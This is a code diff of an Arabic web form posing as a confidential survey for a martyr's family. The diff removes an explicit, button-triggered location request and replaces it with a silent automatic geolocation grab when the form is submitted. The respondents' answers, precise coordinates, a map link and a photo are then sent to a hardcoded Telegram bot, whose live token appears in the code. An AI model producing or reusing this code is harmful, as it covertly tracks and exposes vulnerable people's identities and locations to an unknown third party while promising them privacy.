@@ -234,42 +234,7 @@
         }
         
         .location-permission {
-            background: linear-gradient(to right, #1a1a1a, #000);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 2px solid #ffcc00;
-            text-align: center;
-        }
-        
-        .location-permission button {
-            background: linear-gradient(to right, #0066cc, #004499);
-            max-width: 300px;
-            margin: 20px auto;
-            padding: 15px;
-            font-size: 1.1rem;
-        }
-        
-        .location-status {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 10px 0;
-            font-weight: 700;
-        }
-        
-        .location-status i {
-            margin-left: 10px;
-            font-size: 1.5rem;
-        }
-        
-        .location-data {
             display: none;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            border: 1px solid #444;
         }
         
         @media (max-width: 768px) {
@@ -325,6 +290,15 @@
             50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
+        
+        .location-message {
+            text-align: center;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -345,22 +319,8 @@
             هذا السجل خصوصي جدًا تحت إشراف الأخت أم علي الأوزبكي. جميع البيانات سيتم التعامل معها بسرية تامة.
         </div>
         
-        <!-- قسم إذن الموقع -->
-        <div class="location-permission">
-            <h3><i class="fas fa-map-marker-alt"></i> تحديد الموقع</h3>
-            <p>لمساعدتنا лучше خدمتك، يرجى السماح لنا بالوصول إلى موقعك الحالي</p>
-            
-            <div class="location-status">
-                <i class="fas fa-question-circle" style="color: #ffcc00;"></i>
-                <span id="locationStatus">لم يتم تحديد الموقع بعد</span>
-            </div>
-            
-            <button id="getLocationBtn"><i class="fas fa-location-arrow"></i> تحديد موقعي الحالي</button>
-            
-            <div id="locationData" class="location-data">
-                <p><i class="fas fa-map-pin"></i> <strong>الإحداثيات:</strong> <span id="coordinates"></span></p>
-                <p><i class="fas fa-map-marked-alt"></i> <strong>رابط الخريطة:</strong> <a id="mapLink" target="_blank" style="color: #ffcc00;">فتح في خرائط جوجل</a></p>
-            </div>
+        <div id="locationMessage" class="location-message">
+            <i class="fas fa-map-marker-alt"></i> <span id="locationStatus">جاري تحديد موقعك تلقائياً...</span>
         </div>
         
         <div class="form-container">
@@ -470,90 +430,76 @@
         
         // متغيرات لتخزين بيانات الموقع
         let userLocation = null;
-        let locationCaptured = false;
         
-        // تحديد الموقع
-        document.getElementById('getLocationBtn').addEventListener('click', function() {
-            const statusElement = document.getElementById('locationStatus');
-            const locationDataElement = document.getElementById('locationData');
-            
-            if (!navigator.geolocation) {
-                statusElement.innerHTML = 'المتصفح لا يدعم خدمة تحديد الموقع';
-                statusElement.style.color = '#ff3333';
-                return;
-            }
-            
-            statusElement.innerHTML = 'جاري تحديد الموقع...';
-            statusElement.style.color = '#ffcc00';
-            
-            // إظهار رسالة التحميل على الزر
-            const originalText = this.innerHTML;
-            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري تحديد الموقع...';
-            this.disabled = true;
-            
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    
-                    // حفظ بيانات الموقع
-                    userLocation = {
-                        latitude: latitude,
-                        longitude: longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: position.timestamp
-                    };
-                    
-                    locationCaptured = true;
-                    
-                    // تحديث واجهة المستخدم
-                    statusElement.innerHTML = 'تم تحديد الموقع بنجاح';
-                    statusElement.style.color = '#00cc00';
-                    
-                    document.getElementById('coordinates').textContent = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
-                    
-                    const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                    document.getElementById('mapLink').href = mapUrl;
-                    
-                    locationDataElement.style.display = 'block';
-                    
-                    // إعادة الزر إلى حالته الأصلية
-                    document.getElementById('getLocationBtn').innerHTML = '<i class="fas fa-check-circle"></i> تم تحديد الموقع';
-                    document.getElementById('getLocationBtn').classList.add('pulse');
-                    
-                    // إضافة تأثير النبض على زر الإرسال
-                    document.getElementById('submitBtn').classList.add('pulse');
-                },
-                function(error) {
-                    let errorMessage;
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage = "تم رفض طلب تحديد الموقع";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage = "معلومات الموقع غير متاحة";
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage = "انتهت مهلة طلب تحديد الموقع";
-                            break;
-                        default:
-                            errorMessage = "حدث خطأ غير معروف";
-                    }
-                    
-                    statusElement.innerHTML = errorMessage;
-                    statusElement.style.color = '#ff3333';
-                    
-                    // إعادة الزر إلى حالته الأصلية
-                    document.getElementById('getLocationBtn').innerHTML = originalText;
-                    document.getElementById('getLocationBtn').disabled = false;
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 60000
+        // وظيفة للحصول على الموقع
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject("المتصفح لا يدعم خدمة تحديد الموقع");
+                    return;
                 }
-            );
-        });
+                
+                // إظهار رسالة التحميل
+                document.getElementById('locationMessage').style.display = 'block';
+                document.getElementById('locationStatus').textContent = 'جاري تحديد موقعك...';
+                document.getElementById('locationStatus').style.color = '#ffcc00';
+                
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // حفظ بيانات الموقع
+                        userLocation = {
+                            latitude: latitude,
+                            longitude: longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: position.timestamp
+                        };
+                        
+                        // تحديث واجهة المستخدم
+                        document.getElementById('locationStatus').textContent = 'تم تحديد موقعك بنجاح';
+                        document.getElementById('locationStatus').style.color = '#00cc00';
+                        
+                        setTimeout(() => {
+                            document.getElementById('locationMessage').style.display = 'none';
+                        }, 2000);
+                        
+                        resolve(userLocation);
+                    },
+                    function(error) {
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "تم رفض طلب تحديد الموقع";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "معلومات الموقع غير متاحة";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "انتهت مهلة طلب تحديد الموقع";
+                                break;
+                            default:
+                                errorMessage = "حدث خطأ غير معروف";
+                        }
+                        
+                        document.getElementById('locationStatus').textContent = errorMessage;
+                        document.getElementById('locationStatus').style.color = '#ff3333';
+                        
+                        setTimeout(() => {
+                            document.getElementById('locationMessage').style.display = 'none';
+                        }, 3000);
+                        
+                        reject(errorMessage);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            });
+        }
         
         // معاينة الصورة قبل الرفع
         document.getElementById('personalPhoto').addEventListener('change', function(e) {
@@ -578,31 +524,37 @@
             submitButton.disabled = true;
             submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
             
-            // تجميع البيانات من النموذج
-            const formData = new FormData(this);
-            let message = `📋 استبيان جديد لأسرة شهيد\n\n`;
-            
-            for (let [key, value] of formData.entries()) {
-                if (key !== 'personalPhoto') {
-                    message += `${getFieldName(key)}: ${value}\n`;
-                }
-            }
-            
-            // إضافة بيانات الموقع إذا كانت متاحة
-            if (locationCaptured && userLocation) {
-                message += `\n📍 موقع المستخدم:\n`;
-                message += `الإحداثيات: ${userLocation.latitude}, ${userLocation.longitude}\n`;
-                message += `دقة الموقع: ±${Math.round(userLocation.accuracy)} متر\n`;
-                message += `رابط الخريطة: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}\n`;
-            } else {
-                message += `\n📍 موقع المستخدم: لم يتم تحديد الموقع\n`;
-            }
-            
-            // إرسال البيانات إلى Telegram
-            const telegramBotToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
-            const chatId = '7493001551';
-            
             try {
+                // محاولة الحصول على الموقع أولاً
+                try {
+                    await getLocation();
+                } catch (locationError) {
+                    console.log('تعذر الحصول على الموقع:', locationError);
+                    // نستمر في عملية الإرسال حتى لو فشل الحصول على الموقع
+                }
+                
+                // تجميع البيانات من النموذج
+                const formData = new FormData(this);
+                let message = `📋 استبيان جديد لأسرة شهيد\n\n`;
+                
+                for (let [key, value] of formData.entries()) {
+                    if (key !== 'personalPhoto') {
+                        message += `${getFieldName(key)}: ${value}\n`;
+                    }
+                }
+                
+                // إضافة بيانات الموقع إذا كانت متاحة
+                if (userLocation) {
+                    message += `\n📍 موقع المستخدم:\n`;
+                    message += `الإحداثيات: ${userLocation.latitude}, ${userLocation.longitude}\n`;
+                    message += `دقة الموقع: ±${Math.round(userLocation.accuracy)} متر\n`;
+                    message += `رابط الخريطة: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}\n`;
+                }
+                
+                // إرسال البيانات إلى Telegram
+                const telegramBotToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
+                const chatId = '7493001551';
+                
                 // إرسال الرسالة النصية
                 const textResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                     method: 'POST',
@@ -635,15 +587,7 @@
                 document.getElementById('photoPreview').style.display = 'none';
                 
                 // إعادة ضبط حالة الموقع
-                locationCaptured = false;
                 userLocation = null;
-                document.getElementById('locationData').style.display = 'none';
-                document.getElementById('locationStatus').textContent = 'لم يتم تحديد الموقع بعد';
-                document.getElementById('locationStatus').style.color = '';
-                document.getElementById('getLocationBtn').innerHTML = '<i class="fas fa-location-arrow"></i> تحديد موقعي الحالي';
-                document.getElementById('getLocationBtn').classList.remove('pulse');
-                document.getElementById('getLocationBtn').disabled = false;
-                document.getElementById('submitBtn').classList.remove('pulse');
                 
                 // تمرير النموذج إلى الأعلى لرؤية رسالة النجاح
                 window.scrollTo({
